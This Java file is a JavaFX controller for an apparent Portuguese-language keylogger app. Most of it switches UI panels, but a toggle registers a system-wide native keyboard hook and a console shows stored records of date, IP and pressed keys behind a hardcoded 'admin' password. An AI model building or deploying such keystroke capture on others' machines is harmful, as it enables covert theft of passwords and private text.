package controller;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import java.net.URL;
import java.util.ArrayList;
import java.util.ResourceBundle;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.PasswordField;
import javafx.scene.control.TextArea;
import javafx.scene.control.ToggleButton;
import javafx.scene.image.ImageView;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;
import model.Registrador;
import model.DAO;

public class TelaController implements Initializable {
    @FXML
    private ImageView btnFechar;
    @FXML
    private AnchorPane janelaLogs;
    @FXML
    private AnchorPane janelaPrincipal;
    @FXML
    private ImageView btnPrincipal;
    @FXML
    private ImageView btnPrincipal_selecionado;
    @FXML
    private ImageView btnLogs;
    @FXML
    private ImageView btnLogs_selecionado;
    @FXML
    private ImageView btnInfos;
    @FXML
    private ImageView btnInfos_selecionado;
    @FXML
    private AnchorPane janelaInfos;
    @FXML
    private ToggleButton btnLigaDesliga;
    @FXML
    private AnchorPane fundoAutenticador;
    @FXML
    private AnchorPane janelaAutenticador;
    @FXML
    private PasswordField pfAutenticador;

    public TextArea getTaConsole() {
        return taConsole;
    }

    public void setTaConsole(TextArea taConsole) {
        this.taConsole = taConsole;
    }

    @FXML
    private ImageView toggleLigado;
    @FXML
    private ImageView toggleDesligado;
    @FXML
    private TextArea taConsole;

    private DAO dao = new DAO();

    @Override
    public void initialize(URL url, ResourceBundle rb) {
        btnPrincipal.setVisible(false);
        btnLogs_selecionado.setVisible(false);
        btnInfos_selecionado.setVisible(false);
    }

    @FXML
    private void trocaJanelas(MouseEvent event) {
        if (event.getTarget() == btnPrincipal || event.getTarget() == btnPrincipal_selecionado) {
            janelaPrincipal.setVisible(true);
            janelaAutenticador.setVisible(false);
            fundoAutenticador.setVisible(false);
            janelaLogs.setVisible(false);
            janelaInfos.setVisible(false);

            btnPrincipal_selecionado.setVisible(true);
            btnPrincipal.setVisible(false);
            btnLogs_selecionado.setVisible(false);
            btnLogs.setVisible(true);
            btnInfos_selecionado.setVisible(false);
            btnInfos.setVisible(true);
        } else if (event.getTarget() == btnLogs) {
            janelaPrincipal.setVisible(false);
            janelaAutenticador.setVisible(true);
            fundoAutenticador.setVisible(true);
            janelaLogs.setVisible(true);
            janelaInfos.setVisible(false);

            btnPrincipal_selecionado.setVisible(false);
            btnPrincipal.setVisible(true);
            btnLogs_selecionado.setVisible(true);
            btnLogs.setVisible(false);
            btnInfos_selecionado.setVisible(false);
            btnInfos.setVisible(true);
        } else if (event.getTarget() == btnInfos) {
            janelaPrincipal.setVisible(false);
            janelaAutenticador.setVisible(false);
            fundoAutenticador.setVisible(false);
            janelaLogs.setVisible(false);
            janelaInfos.setVisible(true);

            btnPrincipal_selecionado.setVisible(false);
            btnPrincipal.setVisible(true);
            btnLogs_selecionado.setVisible(false);
            btnLogs.setVisible(true);
            btnInfos_selecionado.setVisible(true);
            btnInfos.setVisible(false);
        } else if (event.getTarget() == btnFechar) {
            Stage stage = (Stage) btnFechar.getScene().getWindow();
            stage.close();
        }
    }

    @FXML
    private void cliqueBtn(ActionEvent event) throws NativeHookException {
        RegistradorController rastreador = new RegistradorController();

        if (btnLigaDesliga.isSelected()) {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(rastreador);
            toggleLigado.setVisible(true);
            toggleDesligado.setVisible(false);
        } else {
            GlobalScreen.unregisterNativeHook();
            
            toggleLigado.setVisible(false);
            toggleDesligado.setVisible(true);
        }
    }

    @FXML
    private void btnAutenticar(MouseEvent event) {
        if ("admin".equals(pfAutenticador.getText())) {
            janelaAutenticador.setVisible(false);
            fundoAutenticador.setVisible(false);
            janelaLogs.setVisible(true);
            pfAutenticador.clear();
        }
    }

    @FXML
    private void updateText(MouseEvent event) {
        ArrayList<Registrador> lista = dao.listarRegistros();
        String texto = "";

        for (Registrador r : lista) {
            texto += "[" + r.getData() + "]" + " - " + "[" + r.getIp() + "]" + " - " + r.getTeclaPressionada() + "\n";
        }

        taConsole.setText(texto);
    }

    @FXML
    private void limparConsole(MouseEvent event) {
        taConsole.clear();
    }
}